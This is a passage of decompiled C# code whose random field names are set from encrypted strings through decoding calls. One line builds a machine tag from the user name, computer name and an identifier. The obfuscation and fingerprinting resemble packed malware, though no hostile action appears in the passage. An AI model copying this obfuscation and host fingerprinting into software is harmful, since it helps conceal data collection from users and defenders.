			yasjygrGJqTJ(getString_0(107409643)),
			yasjygrGJqTJ(getString_0(107410773)),
			yasjygrGJqTJ(getString_0(107409610)),
			yasjygrGJqTJ(getString_0(107409577)),
			yasjygrGJqTJ(getString_0(107409536)),
			yasjygrGJqTJ(getString_0(107410015)),
			yasjygrGJqTJ(getString_0(107409942)),
			yasjygrGJqTJ(getString_0(107409933)),
			yasjygrGJqTJ(getString_0(107409900)),
			yasjygrGJqTJ(getString_0(107409867)),
			yasjygrGJqTJ(getString_0(107409826)),
			yasjygrGJqTJ(getString_0(107409241)),
			yasjygrGJqTJ(getString_0(107409200))
		};
		hrvpUvZQVch = new List<string>
		{
			yasjygrGJqTJ(IeLtjAHHavBrLSv(getString_0(107409191))),
			yasjygrGJqTJ(getString_0(107409110)),
			yasjygrGJqTJ(getString_0(107409017)),
			yasjygrGJqTJ(getString_0(107409432)),
			yasjygrGJqTJ(getString_0(107409339)),
			yasjygrGJqTJ(getString_0(107408730)),
			yasjygrGJqTJ(getString_0(107408637)),
			yasjygrGJqTJ(getString_0(107408540)),
			yasjygrGJqTJ(getString_0(107408991)),
			yasjygrGJqTJ(getString_0(107408862)),
			yasjygrGJqTJ(getString_0(107408801)),
			yasjygrGJqTJ(getString_0(107408192)),
			yasjygrGJqTJ(getString_0(107408099)),
			yasjygrGJqTJ(IeLtjAHHavBrLSv(getString_0(107409191)))
		};
		BCwMNEaFehJEAEW = yasjygrGJqTJ(getString_0(107408002));
		NQvyRawduvn = new List<string>
		{
			yasjygrGJqTJ(getString_0(107408369)),
			yasjygrGJqTJ(getString_0(107407663)),
			yasjygrGJqTJ(getString_0(107407501)),
			yasjygrGJqTJ(getString_0(107407819)),
			yasjygrGJqTJ(getString_0(107407113)),
			yasjygrGJqTJ(getString_0(107407431))
		};
		DseODPGHlUJHTz = new List<string>
		{
			yasjygrGJqTJ(getString_0(107407237)),
			yasjygrGJqTJ(getString_0(107406664)),
			yasjygrGJqTJ(getString_0(107406603))
		};
		ymWcmHxKFUK = getString_0(107396888);
		LLXcNOUYCyLKioNte = getString_0(107396888);
		AUWmIJosBaevVTa = new DateTime(2000, 1, 1);
		YRRZHNAFPrwNg = new DateTime(2100, 1, 1);
		TmUHufxiasI = getString_0(107396883);
		CiXuUORQDucyebW = getString_0(107389469);
		MQqcnUjJySJW = getString_0(107396888);
		FqhbHLSZqIJC = getString_0(107396888);
		lHAXyMZIermpoZjN = getString_0(107396888);
		AgwsOdCnYfgNBXq = getString_0(107396883);
		hIdEvNFMPZXAZxU = getString_0(107396888);
		NovBIDwMVoo = getString_0(107396888);
		EDjNxpdqMiO = new List<string>
		{
			getString_0(107395801),
			getString_0(107396022),
			getString_0(107395835),
			getString_0(107395423)
		};
		PZbbmsztNpThUc = getString_0(107396888);
		qPOqWisoNZy = getString_0(107406542);
		mjZuhRNsUai = getString_0(107396883);
		ziOEkhTdjqOs = getString_0(107396888);
		DdCvxPcpqIjlBe = getString_0(107396888);
		FVsxbyFxxBuvQ = string.Empty;
		EZPgdGEvHHvKM = getString_0(107396888);
		rgbJnxRRJSwteYY = getString_0(107396888);
		wMWziBNyrG = getString_0(107396888);
		gfqhvdfKgsfP = getString_0(107393216);
		uBEJzCKjTTQw = getString_0(107393216);
		HRPqOxfknYLQzX = getString_0(107396888);
		asKNcrEUSHf = getString_0(107396883);
		cHjaHHbOia = getString_0(107396888);
		WhZItuUkxEPNS = getString_0(107396888);
		rIeYkrSOyhlxSLf = getString_0(107396888);
		EavVpVWaUEtkSX = getString_0(107406537);
		uUBDMgTKkvJQpi = getString_0(107396888);
		KWPVAHhGPhNIICC = getString_0(107396883);
		xDhcruhrTvVZb = getString_0(107406488);
		uixeymWYYDLeKYE = getString_0(107396888);
		APHQeaBfdYNB = getString_0(107396888);
		rEMZInNhyyY = getString_0(107396888);
		RzBNrFuKFlhr = getString_0(107396883);
		hLKVRldzJzt = getString_0(107406499);
		gkdVmSrBXFMvvU = getString_0(107396883);
		PvwxfopQfRocU = getString_0(107396883);
		pZpzrWQSyVUq = getString_0(107396888);
		edUQHPvprdg = getString_0(107396888);
		vhPoJYKYool = new string[0];
		OFRFzhlcWBOLOw = getString_0(107396883);
		uBTtlGfiltatoKc = true;
		bGIxAZwJUJakn = getString_0(107396883);
		dHWQzBpmcn = true;
		kaYXkHHFquKVslEia = false;
		KgqHpyJnNWXWNav = false;
		pskvCcQfNWIZ = false;
		eBcYzZJOdxm = getString_0(107406454);
		SsCiUkhFaPaV = false;
		LxmtFaCyczZey = false;
		HQsMhnOffkyCiI = false;
		YBZiXtOnyfJCXsA = false;
		bEJKBhTzHL = true;
		xOMcrEjNtvCmv = getString_0(107406465) + Environment.UserName + getString_0(107406932) + Environment.MachineName + getString_0(107406943) + OMlrSKpvSZZjN.GGrCySNwdT() + getString_0(107406906);
		QcLKmXknCOYlGGyu = false;
		OdPWTsJLcGrySc = new Stopwatch();
		BFoWsrHVmkbzUDmB = 0;
		RVAcslUCYF = 0;
		bpZBDgMzOhYn = false;
		qJZaPzetTV = getString_0(107406897) + OMlrSKpvSZZjN.GGrCySNwdT() + getString_0(107406920);
		IEBbLHGfuE = new List<string>();
		hMYsqEPgcjeZT = new List<string>();
		KbzkVVvOms = new List<string>();
	}
}
